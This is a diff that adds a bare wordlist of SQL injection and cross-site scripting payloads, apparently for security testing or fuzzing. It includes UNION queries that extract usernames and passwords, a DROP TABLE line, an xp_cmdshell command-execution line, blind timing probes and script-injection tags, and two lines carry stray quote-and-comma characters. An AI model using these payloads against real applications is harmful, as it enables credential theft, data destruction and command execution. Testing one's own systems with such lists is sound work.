@@ -1,0 +1,27 @@
+' OR 1=1 --
+' UNION SELECT null, username, password FROM users --
+' AND 1=CONVERT(int, 'a') --
+'; DROP TABLE users; --
+' AND 1=1 --
+' AND 1=0 --
+' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100 --
+' AND IF(1=1, SLEEP(5), 0) --
+' OR BENCHMARK(1000000, MD5('test')) --
+<script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<body onload=alert('XSS')>
+'/**/OR/**/1=1 --
+' OR '1'='1' /*
+' OR 1=1--",
+'%27%20OR%20%271%27=%271%27--
+\" OR \"1\"=\"1\" --
+'; EXEC xp_cmdshell('whoami') --
+' UNION ALL SELECT NULL, NULL --
+' UNION SELECT null, table_name FROM information_schema.tables --
+' OR EXISTS(SELECT 1) --",
+' UNION SELECT null, username, password FROM users WHERE username='admin' --
+' OR 1=CAST('a' AS INT) --
+' OR SLEEP(5) --
+
